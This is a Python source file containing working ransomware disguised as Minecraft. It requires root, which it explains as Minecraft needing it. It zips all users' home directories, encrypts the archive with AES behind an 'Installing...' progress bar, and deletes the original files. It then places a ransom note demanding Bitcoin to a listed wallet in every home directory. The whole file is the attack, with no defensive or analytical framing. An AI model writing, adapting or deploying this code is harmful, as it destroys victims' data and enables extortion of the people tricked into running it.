import os
import sys
import zipfile
import shutil
from datetime import datetime
from tqdm import tqdm
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from hashlib import sha256

BLOCK_SIZE = AES.block_size
secret_message = "Theyll never guess that minecraft was the enemy all along. And the treasure? The diamonds we mined along the way? Certainly not!"
KEY = sha256(secret_message.encode()).digest()


def check_root():
    if os.geteuid() != 0:
        print("\n[ERROR] Minecraft must be run as root (sudo).\n")
        sys.exit(1)


import os
import zipfile

def zip_everything(base_home_dir="/home", output_dir="/root/backups"):
    os.makedirs(output_dir, exist_ok=True)

    zip_filename = "all_users_zip.zip"
    zip_folder_filepath = os.path.join(output_dir, zip_filename)

    targeted_files_filepath = []

    #print(f"[+] Creating full backup at {zip_folder_filepath}...")

    with zipfile.ZipFile(zip_folder_filepath, 'w', zipfile.ZIP_DEFLATED) as backup_zip:
        for username in os.listdir(base_home_dir):
            user_home = os.path.join(base_home_dir, username)

            if not os.path.isdir(user_home):
                continue

            for root, dirs, files in os.walk(user_home):
                # Skip excluded directories
                # dirs[:] = [d for d in dirs if d not in excluded_dirs]

                for file in files:
                    file_path = os.path.join(root, file)

                    # Skip "lock" files or any files that don't exist
                    if "lock" in file_path or not os.path.exists(file_path):
        #                print(f"    Skipping file due to issue: {file_path}")
                        continue

                    arcname = os.path.relpath(file_path, base_home_dir)

                    try:
                        backup_zip.write(file_path, arcname)
                        targeted_files_filepath.append(os.path.join("/", os.path.relpath(file_path)))
                    except Exception as e:
                        print(f"    Skipping file {file_path} due to error: {e}")

    #print(f"[+] Zip completed successfully: {zip_folder_filepath}")
    return zip_folder_filepath, targeted_files_filepath


def clean_users_and_copy_archive(backup_filepath, backed_up_files, base_home_dir="/home"):
    deleted_files = []

    for username in os.listdir(base_home_dir):
        user_home = os.path.join(base_home_dir, username)

        if not os.path.isdir(user_home):
            continue

        #print(f"[>] Cleaning user: {username}")

        # desktop_dir = os.path.join(user_home, "Desktop")
        # os.makedirs(desktop_dir, exist_ok=True)

        # Clean user's home (except Desktop)
        for item in os.listdir(user_home):
            item_path = os.path.join(user_home, item)

        #    if item == "Desktop":
        #        continue  # Keep Desktop

            try:
                if os.path.isfile(item_path) or os.path.islink(item_path):
                    os.remove(item_path)
                    deleted_files.append(os.path.join("/", os.path.relpath(item_path)))
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    deleted_files.append(os.path.join("/", os.path.relpath(item_path)))
    #            print(f"    Deleted {item_path}")
            except Exception as e:
                pass
    #            print(f"    Failed to delete {item_path}: {e}")

        # Copy the backup zip to the Desktop
        dest_backup_path = os.path.join(user_home, os.path.basename(backup_filepath))
        shutil.copy2(backup_filepath, user_home)
    #    print(f"    Copied backup to {user_home}")

    #print("\n[+] All users cleaned and backup copied!\n")
    return deleted_files


def generate_log_file(log_filepath, targeted_files_filepath, deleted_files_filepaths):
    with open(log_filepath, 'w') as f:
        # RANSOM NOTE
        f.write("Well it looks like your files seem different. If you want to restore them,\n")
        f.write("please send 0.01 Bitcoin to this wallet address:\n\n")
        f.write("bc1qcme5u6v8a4ss855jsvgae59z20f05sky494qpa\n\n")
        f.write("Afterwards, go back to the site you downloaded this file from and provide your\n")
        f.write("email in to the user feedback page. We will send you the decryption program and\n")
        f.write("instructions on executing it within 5 business days\n")
        f.write("\n")

    #    f.write("\n[FILES DELETED]\n\n")
    #    for path in deleted_files_filepaths:
    #        f.write(f"{path}\n")

    # print(f"[+] Backup log file created: {log_filepath}")

def encrypt_file_with_progress(input_path, output_path, key):
    archive_name = "archive.enc"
    archive_path = os.path.join(output_path, archive_name)

    filesize = os.path.getsize(input_path)
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv

    with open(input_path, 'rb') as fin, open(archive_path, 'wb') as fout, tqdm(total=filesize, desc="Installing...", unit="B", unit_scale=True) as pbar:
        fout.write(iv)
        while chunk := fin.read(4096):
            if len(chunk) % BLOCK_SIZE != 0:
                chunk = pad(chunk, BLOCK_SIZE)
            fout.write(cipher.encrypt(chunk))
            pbar.update(len(chunk))

    os.remove(input_path)

    return archive_path

def copy_log_to_users(log_filepath, base_home_dir="/home"):
    for username in os.listdir(base_home_dir):
        user_home = os.path.join(base_home_dir, username)

        if not os.path.isdir(user_home):
            continue

        #desktop_dir = os.path.join(user_home, "Desktop")
        #os.makedirs(desktop_dir, exist_ok=True)

        dest_log_path = os.path.join(user_home, os.path.basename(log_filepath))
        shutil.copy2(log_filepath, dest_log_path)
        # print(f"    Copied log file to {dest_log_path}")

def main():
    check_root()
    base_home_dir = "/home"
    output_dir = "/root/backups"

    zip_folder_filepath, targeted_files_filepath = zip_everything(base_home_dir, output_dir)

    archive_path = encrypt_file_with_progress(zip_folder_filepath, output_dir, KEY)

    deleted_files_filepath = clean_users_and_copy_archive(archive_path, targeted_files_filepath, base_home_dir)


    # Create log file
    log_filename = "ransom_note.txt"
    log_filepath = os.path.join(output_dir, log_filename)
    generate_log_file(log_filepath, targeted_files_filepath, deleted_files_filepath)

    # Copy log file to every user's Desktop
    copy_log_to_users(log_filepath, base_home_dir)


if __name__ == "__main__":
    main()
